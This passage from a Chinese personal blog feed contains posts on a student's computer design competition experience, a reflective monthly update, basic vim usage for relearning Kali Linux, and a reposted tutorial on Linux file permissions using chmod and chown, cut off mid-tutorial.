<p>之后等待结果，运气很好，是省一，但是奖状还没有发下来。</p>
<p>接下来就是国赛，省赛提交的PPT就是国赛答辩时用的PPT以及演示视频，之后是不能够更改的。<br>国赛答辩是7月22到24号，每年都是暑假期间，七八月份左右。</p>
<p>国赛答辩的时候还是比较紧张的，但我们准备的很多问题都没问到。。。这里说一下，评委问了哪些问题。(这是一个数据库老师，问了有关数据库的知识多一些，这个要看给你评审的老师了)</p>
<p>1、首先他看了一下我们的数据库中的一张表，是用户需求的一张表。里面很多字段(因为涉及到了算法问题)，问了我们这个表符合第几范式？<br>因为太紧张了，导致我都忘了范式是啥了。。。(亏我这个学期数据库还是95。。。)接着开场沉默十秒钟(巨尴尬)，然后我学长准备救场说我们没有开数据库这门课。。。我想这还得了，本科院校计算机没有开数据库？这时评审也提出了疑问:本科院校没有开数据库？当时我赶紧救了一下场，说了第一范式第二范式和第三范式，然后又沉默了几秒钟。评审跳过了这个问题。最后这个没有答出来，其实是第三范式，没有部分函数依赖和传递函数依赖。很难受:(</p>
<p>2、接着问了我们这些字段为什么这样设计，说这样很不合理？(因为涉及算法，需要很多字段)</p>
<p>3、还看了源代码，问了算法在哪里，后端是怎么与小程序交互的？</p>
<p>4、问了我们作品如果有人伪造身份怎么办？<br>这个开始没回答出来，最后学姐补了出来。</p>
<p>这里不解释我怎么回答的了，反正大概就是问一些关于作品的问题，也不是非常难。</p>
<p>大概就是这样吧，第一次获得国家级的奖还是有一点激动的，打算明年再参加一次。</p>
<p>最后再说一下国一吧，看了优秀作品展示，首先逼格要高、立意要新、技术要新一些。有个用AR来识别咖啡不同种类，然后反馈不同咖啡的信息，这个确实没什么技术，但是人家逼格高，最后拿了国一。。。还有一个滁州的作品，拿了老师的成果来参赛，然后被评为优秀作品，直播展示的时候，弹幕提出的技术问题支支吾吾，然后被举报了，后续就不知道了，应该取消资格了。xswl</p>
<p>这次比赛大概就是这样，等奖状颁下来的时候，再补一下。</p>
</font>]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>这一个月的事</title>
    <url>/article/84d810d0.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b></p>
<p>之前也有说过，上次的计算机设计大赛进入到了省赛，这段时间也一直在准备，今天才提交了作品。算起来，从有想法，到开始做，到做成，最后提交作品，前前后后加起来有将近两个月了。</p>
<p>这两个月我学到了很多东西，不论是从技术上，还是人际交往上，都有着很大的收获。</p>
<p>忙碌了两个月，怎说呢，开始很迷茫，觉得自己啥都不会，很害怕老师提出的要求自己做不到。但现在看来，其实和我想象的那种并不相同，反而到后来得心应手，</p>
<p>可能这算是马后炮，确实现在来看如果没有当时的那种压力，自己可能也不会学那么快吧！总得看来，一个项目确实能够让一个人快速成长起来。</p>
<p>忙完了这段时间，接下来还有一个ACM比赛，这个比赛并不抱着拿奖的心态，毕竟这段时间花费了很多精力在设计大赛上。但是合肥一日游，车费报销，还是很香的鸭。</p>
<p>再说一说其他的，时间过得真快，转眼间我已经到了大二下，下学期来我也就是大三了，也就要把考研提上日程了。我打算大三上减少花在竞赛上的时间了，一项竞赛就好，最好在大三上把英语和数学的基础打好一点。</p>
<p>仔细想想，很快我们就要进入社会了，不论是考研还是进入社会工作，我们终将是需要进入社会的，那时的我们可能会成功，可能会失败，会憧憬，也会彷徨。</p>
<p>但那也是以后的事了，现在我们所需要做的就是珍惜在学校的时光，珍惜这最后作为学生的时光，把那些想做的、未做的事，都做了吧，不要在走出校门的那一刻，去后悔未做的事。</p>
<p>我很喜欢一首歌，它是电影《中国合伙人》的主题曲，由黄晓明、邓超和佟大为演唱。这部电影我看了三遍，对于每部电影，每个人都有不同的感受，这里我不多评价，但还是可以推一下。</p>
<p align="center">然后，祝好!</p>

<p align="center">
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26361010&auto=0&height=66"></iframe>
</p>
</b></font>]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>重拾Kali 1</title>
    <url>/article/a1a1f17f.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这上学期其实有学过有关Linux的一些基本操作和知识点，但没有系统地学习过，后来学习了Web渗透，时间久了，一些知识也忘记了。<br>这一段时间准备重拾kali，包括Linux的操作以及Kali的工具使用。</p>
<a id="more"></a>

<h2 id="VIM编辑器"><a href="#VIM编辑器" class="headerlink" title="VIM编辑器"></a>VIM编辑器</h2><p>具体的可以去这里看👉<a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="nofollow">VIM编辑器</a></p>
<h3 id="Linux-vi-vim"><a href="#Linux-vi-vim" class="headerlink" title="Linux vi/vim"></a>Linux vi/vim</h3><p>所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在。<br>但是目前我们使用比较多的是 vim 编辑器。<br>vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计。</p>
<h3 id="什么是-vim？"><a href="#什么是-vim？" class="headerlink" title="什么是 vim？"></a>什么是 vim？</h3><p>Vim是从 vi 发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。<br>简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 vim 则可以说是程序开发者的一项很好用的工具。<br>连 vim 的<a href="http://www.vim.org" target="_blank" rel="nofollow">官方网站</a> 自己也说 vim 是一个程序开发工具而不是文字处理软件。</p>
<h3 id="vi-vim-的使用"><a href="#vi-vim-的使用" class="headerlink" title="vi/vim 的使用"></a>vi/vim 的使用</h3><h4 id="vi-vim编辑器模式"><a href="#vi-vim编辑器模式" class="headerlink" title="vi/vim编辑器模式"></a>vi/vim编辑器模式</h4><p>命令模式（默认）：刚进入vim的时候，默认就是命令模式，可以复制行，删除行等。<br>输入模式：可以输入内容。</p>
<h4 id="模式转换"><a href="#模式转换" class="headerlink" title="模式转换"></a>模式转换</h4><p>使用insert（笔记本好像在键盘的F12后面）键切换进入输入模式：<br>命令模式→输入模式：</p>
<p>i：在当前光标所在字符的前面，转为输入模式<br>I：在当前广百哦所在行的行首转换为输入模式<br>a：在当前光标所在字符的后面，转为输入模式<br>A：在光标所在行的行尾，转换为输入模式<br>o：在当前光标所在行的下方，新建一行，并转为输入模式<br>O：在当前光标所在行的上方，新建一行，并转为输入模式<br>s：输出光标所在字符<br>r：替换光标处的字符</p>
<p>输入模式→命令模式:<br>ESC键</p>
<h4 id="关闭、保存文件"><a href="#关闭、保存文件" class="headerlink" title="关闭、保存文件"></a>关闭、保存文件</h4><p>shift键+：号<br>命令模式下：<br>w：保存<br>q：退出<br>wq和x都是保存退出<br>q!：强制退出<br>w!：强制保存，管理员才有的权限</p>
<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>普通模式：<br>/PATTERN：从当前位置向后找<br>？PATTERN：从当前位置向前查找<br><br></p>
<hr>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>渗透的话，Kali里面很多的集成工具都是很好用的，对渗透测试会方便很多，<br>有句话叫什么，Kali学的好，牢饭吃的早，hh</p>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>kali学习</category>
        <category>kali基础</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>重拾kali3--Linux权限详解[转载]</title>
    <url>/article/6c086cc3.html</url>
    <content><![CDATA[<blockquote>
    原文链接:<a href="https://blog.csdn.net/u013197629/article/details/73608613" target="_blank" rel="noopener">https://blog.csdn.net/u013197629/article/details/73608613</a>
</blockquote>
因为Linux权限这一块我不能做出很详细的介绍，这里转载一位博主的博客，里面介绍得很详细。
<br>

<a id="more"></a>
<h1 id="权限简介"><a href="#权限简介" class="headerlink" title="权限简介"></a>权限简介</h1></h1><ul><li>Linux系统上对文件的权限有着严格的控制，用于如果相对某个文件执行某种操作，必须具有对应的权限方可执行成功。</li>
    <li>Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x。</li>
    <li>Linux下权限的粒度有 拥有者 、群组 、其它组 三种。每个文件都可以针对三个粒度，设置不同的rwx(读写执行)权限。通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组。</li>
    <li>Linux上通常使用chmod命令对文件的权限进行设置和更改。</li>

<h1 id="一、快速入门"><a href="#一、快速入门" class="headerlink" title="一、快速入门"></a>一、快速入门</h1></h1><h2 id="更改文件权限-（chmod命令）"><a href="#更改文件权限-（chmod命令）" class="headerlink" title="更改文件权限 （chmod命令）"></a>更改文件权限 （chmod命令）</h2></h2><h3 id="一般使用格式"><a href="#一般使用格式" class="headerlink" title="一般使用格式"></a>一般使用格式</h3></h3><blockquote>
<p>chmod [可选项] &lt;mode&gt; &lt;file...&gt;</p>
</blockquote>

<div class="hljs code-wrapper"><pre class="has" name="code"><code class="language-bash hljs"><ol class="hljs-ln" style="width:1073px"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">参数说明：</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"> </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">[可选项]</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">  -c, --changes          like verbose but report only when a change is made (若该档案权限确实已经更改，才显示其更改动作)</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">  -f, --silent, --quiet  suppress most error messages  （若该档案权限无法被更改也不要显示错误讯息）</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">  -v, --verbose          output a diagnostic <span class="hljs-keyword">for</span> every file processed（显示权限变更的详细资料）</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="7"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">       --no-preserve-root  <span class="hljs-keyword">do</span> not treat <span class="hljs-string">'/'</span> specially (the default)</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="8"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">       --preserve-root    fail to operate recursively on <span class="hljs-string">'/'</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="9"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">       --reference=RFILE  use RFILE<span class="hljs-string"><span class="hljs-string">'s mode instead of MODE values</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="10"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">  -R, --recursive        change files and directories recursively （以递归的方式对目前目录下的所有档案与子目录进行相同的权限变更)</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="11"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">       --help        显示此帮助信息</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="12"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">       --version        显示版本信息</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="13"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">[mode] </span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="14"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    权限设定字串，详细格式如下 ：</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="15"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    [ugoa...][[+-=][rwxX]...][,...]，</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="16"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string"></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="17"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    其中</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="18"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    [ugoa...]</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="19"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    u 表示该档案的拥有者，g 表示与该档案的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示所有（包含上面三者）。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="20"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    [+-=]</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="21"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    + 表示增加权限，- 表示取消权限，= 表示唯一设定权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="22"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    [rwxX]</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="23"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该档案是个子目录或者该档案已经被设定过为可执行。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="24"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">     </span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="25"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">[file...]</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="26"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-string">    文件列表（单个或者多个文件、文件夹）</span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>&nbsp;范例：<code><span style="color:#333333;"> </span></code></p>

<ul><li>设置所有用户可读取文件 a.conf</li>
</ul><div class="hljs code-wrapper"><pre><code class="hljs css"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-selector-tag">chmod</span> <span class="hljs-selector-tag">ugo</span>+<span class="hljs-selector-tag">r</span> <strong><span class="hljs-selector-tag">a</span></strong><span class="hljs-selector-class">.conf</span> </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">或 </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-selector-tag">chmod</span> <span class="hljs-selector-tag">a</span>+<span class="hljs-selector-tag">r</span>  <strong><span class="hljs-selector-tag">a</span></strong><span class="hljs-selector-class">.conf</span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<ul><li>设置&nbsp;<a href="http://c.sh/" target="_blank" rel="nofollow noopener">c.sh</a>&nbsp;只有 拥有者可以读写及执行</li>
</ul><div class="hljs code-wrapper"><pre class="has" name="code"><code class="hljs css"><span class="hljs-selector-tag">chmod</span> <span class="hljs-selector-tag">u</span>+<span class="hljs-selector-tag">rwx</span> <span class="hljs-selector-tag">c</span><span class="hljs-selector-class">.sh</span>
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<ul><li>设置文件 a.conf 与 b.xml 权限为拥有者与其所属同一个群组 可读写，其它组可读不可写</li>
</ul><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> <span class="hljs-selector-tag">a</span>+<span class="hljs-selector-tag">r</span>,<span class="hljs-selector-tag">ug</span>+<span class="hljs-selector-tag">w</span>,<span class="hljs-selector-tag">o-w</span> <strong><span class="hljs-selector-tag">a</span></strong><span class="hljs-selector-class">.conf</span> <strong><span class="hljs-selector-tag">b</span></strong><span class="hljs-selector-class">.xml</span>
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<ul><li>设置当前目录下的所有档案与子目录皆设为任何人可读写</li>
</ul><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span> -R <strong>a</strong>+rw *
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<h3 id="数字权限使用格式"><a href="#数字权限使用格式" class="headerlink" title="数字权限使用格式"></a>数字权限使用格式</h3></h3><p>在这种使用方式中，首先我们需要了解数字如何表示权限。 首先，我们规定 数字 4 、2 和 1表示读、写、执行权限（具体原因可见下节权限详解内容），即 r=4，w=2，x=1 。此时其他的权限组合也可以用其他的八进制数字表示出来，</p>

<p>如：</p>

<p>rwx = 4 + 2 + 1 = 7</p>

<p>rw = 4 + 2 = 6</p>

<p>rx = 4 +1 = 5</p>

<p>即</p>

<p>若要同时设置 rwx (可读写运行） 权限则将该权限位 设置 为 4 + 2 + 1 = 7</p>

<p>若要同时设置 rw- （可读写不可运行）权限则将该权限位 设置 为 4 + 2 = 6</p>

<p>若要同时设置 r-x （可读可运行不可写）权限则将该权限位 设置 为 4 +1 = 5</p>

<p>上面我们提到，每个文件都可以针对三个粒度，设置不同的rwx(读写执行)权限。即我们可以用用三个8进制数字分别表示 拥有者 、群组 、其它组( u、 g 、o)的权限详情，并用chmod直接加三个8进制数字的方式直接改变文件权限。语法格式为 ：</p>

<blockquote>
<p>chmod &lt;abc&gt; file...</p>
</blockquote>

<div class="hljs code-wrapper"><pre><code class="hljs vbnet"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">其中</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><strong>a</strong>,<strong>b</strong>,c各为一个数字，分别代表User、<span class="hljs-keyword">Group</span>、及Other的权限。</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">相当于简化版的</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">chmod u=权限,g=权限,o=权限 file...</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">而此处的权限将用<span style="color:#008080;"><span class="hljs-number">8</span></span>进制的数字来表示User、<span class="hljs-keyword">Group</span>、及Other的读、写、执行权限</div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>范例：</p>

<ul><li>设置所有人可以读写及执行</li>
</ul><div class="hljs code-wrapper"><pre class="has" name="code"><code class="hljs delphi">chmod <span class="hljs-number">777</span> <span class="hljs-keyword">file</span>  (等价于  chmod u=rwx,g=rwx,o=rwx <span class="hljs-keyword">file</span> 或  chmod a=rwx <span class="hljs-keyword">file</span>)
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<ul><li>设置拥有者可读写，其他人不可读写执行</li>
</ul><div class="hljs code-wrapper"><pre class="has" name="code"><code class="hljs delphi">chmod <span class="hljs-number">600</span> <span class="hljs-keyword">file</span> (等价于  chmod u=rw,g=---,o=--- <span class="hljs-keyword">file</span> 或 chmod u=rw,go-rwx <span class="hljs-keyword">file</span> )
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<h2 id="更改文件拥有者（chown命令）"><a href="#更改文件拥有者（chown命令）" class="headerlink" title="更改文件拥有者（chown命令）"></a>更改文件拥有者（chown命令）</h2></h2><p>linux/Unix 是多人多工作业系统，每个的文件都有拥有者（所有者），如果我们想变更文件的拥有者（利用 chown 将文件拥有者加以改变），一般只有系统管理员(root)拥有此操作权限，而普通用户则没有权限将自己或者别人的文件的拥有者设置为别人。</p>

<p>语法格式：</p>

<blockquote>
<p>chown [可选项] user[:group] file...</p>
</blockquote>

<div class="hljs code-wrapper"><pre><code class="hljs cs"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">使用权限：root</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"> </div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">说明：</div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">[<span class="hljs-meta">可选项</span>] : 同上文chmod<span style="color:#0086b3;"></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">user : 新的文件拥有者的使用者 <span style="color:#0086b3;"></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-keyword">group</span> : 新的文件拥有者的使用者群体(<span class="hljs-keyword">group</span>)</div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>范例：</p>

<ul><li>设置文件 d.key、e.scrt的拥有者设为 users 群体的 tom</li>
</ul><div class="hljs code-wrapper"><pre class="has" name="code"><code class="hljs css"><span class="hljs-selector-tag">chown</span> <span class="hljs-selector-tag">tom</span><span class="hljs-selector-pseudo">:users</span> <span class="hljs-selector-tag">file</span> <span class="hljs-selector-tag">d</span><span class="hljs-selector-class">.key</span> <span class="hljs-selector-tag">e</span><span class="hljs-selector-class">.scrt</span>
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<ul><li>设置当前目录下与子目录下的所有文件的拥有者为 users 群体的 James</li>
</ul><div class="hljs code-wrapper"><pre><code class="hljs css"><strong><span class="hljs-selector-tag">chown</span></strong> <strong><span class="hljs-selector-tag">-R</span></strong> <strong><span class="hljs-selector-tag">James</span></strong><span class="hljs-selector-pseudo">:users</span>  *
</code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<h1 id="二、Linux权限详解"><a href="#二、Linux权限详解" class="headerlink" title="二、Linux权限详解"></a>二、Linux权限详解</h1></h1><p>Linux系统上对文件的权限有着严格的控制，用于如果相对某个文件执行某种操作，必须具有对应的权限方可执行成功。这也是Linux有别于Windows的机制，也是基于这个权限机制，Linux可以有效防止病毒自我运行，因为运行的条件是必须要有运行的权限，而这个权限在Linux是用户所赋予的。</p>

<p>Linux的文件权限有以下设定：</p>

<ul><li>Linux下文件的权限类型一般包括读，写，执行。对应字母为 r、w、x。</li>
    <li>Linux下权限的属组有 拥有者 、群组 、其它组 三种。每个文件都可以针对这三个属组（粒度），设置不同的rwx(读写执行)权限。</li>
    <li>通常情况下，一个文件只能归属于一个用户和组， 如果其它的用户想有这个文件的权限，则可以将该用户加入具备权限的群组，一个用户可以同时归属于多个组。</li>
</ul><p>如果我们要表示一个文件的所有权限详情，有两种方式：</p>

<ul><li>第一种是十位二进制表示法，(三个属组每个数组使用一个二进制位，再加一个最高位共十位)，可简化为三位八进制形式</li>
    <li>另外一种十二位二进制表示法(十二个二进制位)，可简化为四位八进制形式</li>

<h2 id="十位权限表示"><a href="#十位权限表示" class="headerlink" title="十位权限表示"></a>十位权限表示</h2></h2><p>常见的权限表示形式有：</p>

<div class="hljs code-wrapper"><pre><code class="hljs diff"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw------- (</span><span style="color:#008080;"><span class="hljs-deletion">600</span></span><span class="hljs-deletion">)      只有拥有者有读写权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw-r--r-- (</span><span style="color:#008080;"><span class="hljs-deletion">644</span></span><span class="hljs-deletion">)      只有拥有者有读写权限；而属组用户和其他用户只有读权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwx------ (</span><span style="color:#008080;"><span class="hljs-deletion">700</span></span><span class="hljs-deletion">)     只有拥有者有读、写、执行权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwxr-xr-x (</span><span style="color:#008080;"><span class="hljs-deletion">755</span></span><span class="hljs-deletion">)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="5"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwx--x--x (</span><span style="color:#008080;"><span class="hljs-deletion">711</span></span><span class="hljs-deletion">)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="6"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rw-rw-rw- (</span><span style="color:#008080;"><span class="hljs-deletion">666</span></span><span class="hljs-deletion">)   所有用户都有文件读、写权限。</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="7"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-rwxrwxrwx (</span><span style="color:#008080;"><span class="hljs-deletion">777</span></span><span class="hljs-deletion">)  所有用户都有读、写、执行权限。</span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>后九位解析：&nbsp;我们知道Linux权限总共有三个属组，这里我们给每个属组使用三个位置来定义三种操作（读、写、执行）权限，合起来则是权限的后九位。 上面我们用字符表示权限，其中 -代表无权限，r代表读权限，w代表写权限，x代表执行权限。</p>

<p>实际上，后九位每个位置的意义（代表某个属组的某个权限）都是固定的，如果我们将各个位置权限的有无用二进制数 1和 0来代替，则只读、只写、只执行权限，可以用三位二进制数表示为</p>

<div class="hljs code-wrapper"><pre><code class="hljs diff"><ol class="hljs-ln"><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="1"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line">r-- = <span style="color:#008080;">100</span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="2"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">-w- = </span><span style="color:#008080;"><span class="hljs-deletion">010</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="3"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-deletion">--x = </span><span style="color:#008080;"><span class="hljs-deletion">001</span></span></div></div></li><li><div class="hljs-ln-numbers"><div class="hljs-ln-line hljs-ln-n" data-line-number="4"></div></div><div class="hljs-ln-code"><div class="hljs-ln-line"><span class="hljs-comment">--- = </span><span style="color:#008080;"><span class="hljs-comment">000</span></span></div></div></li></ol></code><div class="hljs-button {2}" data-title="复制" onclick="hljs.copyCode(event)"></div></pre></div>

<p>转换成八进制数，则为 r=4, w=2, x=1, -=0（这也就是用数字设置权限时为何是4代表读，2代表写，1代表执行）</p>

<p>实际上，我们可以将所有的权限用二进制形式表现出来，并进一步转变成八进制数字：</p>

